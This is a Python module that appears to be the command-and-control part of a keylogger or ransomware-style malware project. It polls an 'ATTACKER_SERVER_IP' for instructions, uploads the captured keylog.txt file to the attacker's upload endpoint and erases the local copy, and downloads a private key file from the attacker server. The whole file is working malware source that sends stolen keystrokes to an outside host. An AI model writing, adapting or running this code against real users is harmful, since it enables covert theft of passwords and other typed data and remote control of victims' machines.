###########################################################################################################################
####################################################     LIBRARIES     ####################################################
###########################################################################################################################

import requests

###########################################################################################################################
#################################################     INITIALIZATIONS     #################################################
###########################################################################################################################

KEYLOG_TXT_FILE = './media/keylog.txt'
ATTACKER_SERVER_IP = 'http://10.0.2.15:8000'

def get_server_response():
    try:
        response = requests.get(ATTACKER_SERVER_IP)
        # Raise an HTTPError for bad responses (4xx or 5xx)
        response.raise_for_status()
        content = response.text
        return content
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"

def get_instruction():
    server_response = get_server_response()
    try: command = server_response.split('\n')[1]
    except: command = 'Error'
    return command

# Sends keylog.txt to the attacker machine and resets it
def send_keylog_to_attacker():
    with open(KEYLOG_TXT_FILE, 'rb') as file:
        files = {'file': (file.name, file)}
        response = requests.post(f'{ATTACKER_SERVER_IP}/upload_file', files=files)
        # print(f'Status code: {response.status_code}')

    reset_keylog_file()

# Erases all the content of the keylog.txt file
def reset_keylog_file():
    with open(KEYLOG_TXT_FILE, 'w'): pass

# Resets the current instruction so the program waits for the new one
def reset_instruction():
    try:
        response = requests.get(f'{ATTACKER_SERVER_IP}/reset_instruction')
        # Raises an HTTPError for bad responses (4xx or 5xx)
        response.raise_for_status()
        # print('\tInstruction successfully reseted!')
    except requests.exceptions.RequestException as e:
        # print(f"Error resetting the instruction: {e}")
        pass

def download_secret_key():
    response = requests.get(f'{ATTACKER_SERVER_IP}/send_secret_key')
    if response.status_code == 200:
        with open('./media/private.pem', 'wb') as file:
            file.write(response.content)
    else: pass

###########################################################################################################################
#####################################################     PROGRAM     #####################################################
###########################################################################################################################

def run():
    return_data = "no_data"

    instruction = get_instruction()
    if instruction: return_data = instruction

    next_action = "instructions"
    print("[+] Instructions module activated...")
    return return_data, next_action

if __name__ == '__main__':
    print(get_instruction())